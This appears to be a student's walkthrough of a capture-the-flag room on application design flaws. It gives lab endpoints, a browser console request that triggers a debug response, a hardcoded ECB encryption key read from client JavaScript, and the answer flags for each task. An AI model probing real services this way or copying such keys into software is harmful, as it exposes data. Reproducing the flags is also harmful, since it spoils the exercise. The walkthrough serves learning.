#Application Design Flaws

## task 1 Introduction

I am ready to learn about design flaw vulnerabilities!
* No answer needed


## task 2  AS02: Security Misconfigurations

Navigate to 10.114.177.153:5002. It appears that the developers left too many traces in their User Management APIs.

* http://10.114.177.153:5002/api/user/w
* the answer is THM{V3RB0S3_3RR0R_L34K}


## task 3 

Navigate to 10.114.177.153:5003. The code is outdated and imports an old lib/vulnerable_utils.py component. Can you debug it?

* in the console
```
fetch("http://10.201.60.7:5003/api/process", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        data: "debug"
    })
})
.then(res => res.json())
.then(data => console.log("SERVER RESPONSE:", data))
.catch(err => console.error("ERROR:", err));
```
* The answer is THM{SUPPLY_CH41N_VULN3R4B1L1TY}


## task 4 AS04: Cryptographic Failures

AS04: Cryptographic Failures

* http://10.201.60.7:5004](http://10.201.60.7:5004/static/js/decrypt.js
* const SECRET_KEY = "my-secret-key-16";
* const ENCRYPTION_MODE = "ECB";
* const KEY_SIZE = 128;
* THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}


## task 5 AS06: Insecure Design

Navigate to 10.114.177.153:5005. Have they assumed that only mobile devices can access it?

* http://10.114.177.153:5005/api/messages/admin
* the answer is THM{1NS3CUR3_D35IGN_4SSUMPT10N}

## task 6 Conclusion

I'm ready for the next room!

* No answer needed



### end 
